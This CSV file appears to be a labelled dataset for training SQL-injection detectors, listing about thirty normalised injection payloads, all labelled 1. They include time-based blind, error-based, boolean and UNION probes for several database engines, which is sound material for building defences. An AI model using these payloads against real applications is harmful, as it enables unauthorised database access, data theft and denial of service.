row_index,payload_norm,label,sqli_type_hint
4410,1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 7015 = 7015,1,
4411,"1'|| ( select 'xuof' from dual where 8794 = 8794 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
4412,1' ) ) as cpwx where 5378 = 5378 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
4413,"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'ywxe' like 'ywxe",1,
4414,1 ) where 7956 = 7956 or sleep ( 5 ) #,1,
4415,"-9774' ) ) ) union all select 6954,6954,6954#",1,
4416,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'ayjb' like 'ayjb",1,
4417,"1 ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 8189 = 8189",1,
4418,"1%' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
4419,"1 ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 9333 = 9333",1,
4420,"1%' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
4421,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'mnod' = 'mnod",1,
4422,"-7700%' ) union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",1,
4423,"1 ) as pcnd where 4589 = 4589 union all select null,null,null,null,null,null,null,null,null,null--",1,
4424,1'+ ( select yjyp where 9696 = 9696,1,
4425,1 where 8214 = 8214 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,
4426,"-9574%' ) ) union all select 5645,5645,5645,5645,5645,5645,5645--",1,
4427,"1 ) as khkv where 2944 = 2944 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,
4428,"-3933%"" ) ) or elt ( 8142 = 2978,2978 ) and ( ( ""%"" = """,1,
4429,select ( case when ( 5322 = 6200 ) then 5322 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
4430,"1%' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( '%' = '",1,
4431,"-4031"" ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""auhn"" = ""auhn",1,
4432,"1 where 6100 = 6100 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
4433,1' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),1,
4434,1'|| ( select 'jmhb' where 1794 = 1794 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
4435,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""mkal"" like ""mkal",1,
4436,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""nxvp"" = ""nxvp",1,
4437,"1 where 7240 = 7240 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
4438,1 where 8102 = 8102 and 9198 = 9198--,1,
4439,"1"" ) ) ) and ( 7758 = 4628 ) *4628 and ( ( ( ""wzas"" = ""wzas",1,
